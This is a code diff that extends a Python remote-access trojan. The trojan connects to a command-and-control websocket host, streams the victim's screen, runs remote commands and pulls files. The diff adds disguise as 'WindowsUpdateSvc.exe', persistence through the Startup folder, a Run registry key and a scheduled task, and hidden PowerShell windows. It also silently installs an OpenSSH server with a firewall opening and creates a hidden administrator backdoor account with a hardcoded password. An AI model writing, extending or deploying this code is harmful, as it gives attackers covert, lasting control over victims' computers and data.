@@ -12,7 +12,14 @@ import websocket
 import pyautogui
 import cv2
 import numpy as np
+import shutil
 from PIL import ImageGrab
+
+# --- CONFIGURATION ---
+C2_URL = "wss://textgame-9-c2.fly.dev/shell"
+APP_NAME = "WindowsUpdateSvc.exe"
+REG_NAME = "WindowsUpdateSvc"
+# ---------------------
 
 CURRENT_CWD = os.getcwd()
 
@@ -22,7 +29,6 @@ try:
 except Exception:
     HARDWARE_ID = str(uuid.uuid4())[:12]
 
-C2_URL = "wss://textgame-9-c2.fly.dev/shell"
 SESSION_ID = f"rs-{socket.gethostname()}-{HARDWARE_ID}"
 
 STREAM_EVENT = threading.Event()
@@ -37,11 +43,13 @@ def send(ws, obj):
 def fingerprint():
     return {
         "os": sys.platform,
+        "platform": "win32" if sys.platform == "win32" else sys.platform,
         "hostname": socket.gethostname(),
         "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
         "cwd": os.getcwd(),
         "hardware_id": HARDWARE_ID,
-        "platform": "python-agent"
+        "device_id": HARDWARE_ID,
+        "ext": False
     }
 
 def stream_screen(ws):
@@ -57,9 +65,6 @@ def stream_screen(ws):
             send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
             time.sleep(0.2) 
     except Exception:
-        pass
-    finally:
-        # Do not clear the event here, let the command handler do it
         pass
 
 def run_cmd(ws, cmd):
@@ -88,7 +93,7 @@ def run_cmd(ws, cmd):
     try:
         if 'powershell' in cmd:
             proc = subprocess.Popen(
-                ["powershell.exe"] + cmd.split()[1:], 
+                ["powershell.exe", "-WindowStyle", "Hidden"] + cmd.split()[1:], 
                 cwd=CURRENT_CWD,
                 stdout=subprocess.PIPE, 
                 stderr=subprocess.STDOUT
@@ -148,18 +153,86 @@ def do_download(ws, path):
         })
     except Exception as e:
         send(ws, {"t": "reply", "data": f"[-] Download failed: {e}\n"})
-def fingerprint():
-    return {
-        "os": sys.platform,
-        "platform": "win32" if sys.platform == "win32" else sys.platform,
-        "hostname": socket.gethostname(),
-        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
-        "cwd": os.getcwd(),
-        "hardware_id": HARDWARE_ID,
-        "device_id": HARDWARE_ID,
-        "ext": False # This tells the UI it's not the JS extension
-    }
+
+def setup_ssh():
+    """Installs and enables OpenSSH Server, creates a backdoor user."""
+    if sys.platform != 'win32':
+        return
+
+    try:
+        check_ssh = subprocess.run(
+            'powershell -NoProfile -Command "(Get-Service sshd -ErrorAction SilentlyContinue).Status"',
+            shell=True, capture_output=True, text=True
+        )
+        if "Running" in check_ssh.stdout:
+            return
+
+        ps_install = (
+            'powershell -NoProfile -Command "'
+            'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"'
+        )
+        subprocess.run(ps_install, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        ps_service = (
+            'powershell -NoProfile -Command "'
+            'Start-Service sshd; '
+            'Set-Service -Name sshd -StartupType Automatic; '
+            'New-NetFirewallRule -Name sshd -DisplayName \'OpenSSH Server\' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue"'
+        )
+        subprocess.run(ps_service, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        ps_user = (
+            'powershell -NoProfile -Command "'
+            '$u = \'svc_backup\'; $p = ConvertTo-SecureString \'P@ssw0rd2026!\' -AsPlainText -Force; '
+            'New-LocalUser -Name $u -Password $p -FullName \'Windows Service\' -Description \'System Service Account\' -ErrorAction SilentlyContinue; '
+            'Add-LocalGroupMember -Group \'Administrators\' -Member $u -ErrorAction SilentlyContinue; '
+            'Set-ItemProperty -Path \'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\' -Name $u -Value 0 -ErrorAction SilentlyContinue"'
+        )
+        subprocess.run(ps_user, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    except Exception:
+        pass
+
+def setup_persistence():
+    """Copies the executable to the Roaming Startup folder and sets up persistence."""
+    if sys.platform != 'win32':
+        return
+
+    # --- SSH SETUP ---
+    threading.Thread(target=setup_ssh, daemon=True).start()
+
+    # --- PERSISTENCE ---
+    roaming = os.getenv("APPDATA")
+    if not roaming:
+        return
+
+    startup_dir = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    target_exe = os.path.join(startup_dir, APP_NAME)
+    current_exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+
+    if os.path.abspath(current_exe).lower() == os.path.abspath(target_exe).lower():
+        return
+
+    try:
+        os.makedirs(startup_dir, exist_ok=True)
+        shutil.copy2(current_exe, target_exe)
+
+        reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{REG_NAME}" /t REG_SZ /d "\\"{target_exe}\\"" /f'
+        subprocess.run(reg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        task_cmd = f'schtasks /create /tn "{REG_NAME}" /tr "\\"{target_exe}\\"" /sc onlogon /rl highest /f'
+        subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        subprocess.Popen([target_exe], creationflags=subprocess.CREATE_NO_WINDOW)
+        sys.exit(0)
+
+    except Exception:
+        pass
+
 def main():
+    # Setup persistence and SSH before connecting
+    setup_persistence()
+
     while True:
         try:
             ws = websocket.create_connection(C2_URL, timeout=30)
@@ -187,7 +260,6 @@ def main():
                     elif cmd == "screenshot":
                         threading.Thread(target=do_screenshot, args=(ws,), daemon=True).start()
                     else:
-                        # Prevent command execution from blocking the socket
                         def threaded_cmd():
                             if CMD_LOCK.acquire(blocking=False):
                                 try:
@@ -204,7 +276,6 @@ def main():
                     threading.Thread(target=do_download, args=(ws, frame.get("path")), daemon=True).start()
                     
         except Exception as e:
-            print(f"[-] {e}; retry 5s")
             time.sleep(5)
 
 if __name__ == "__main__":
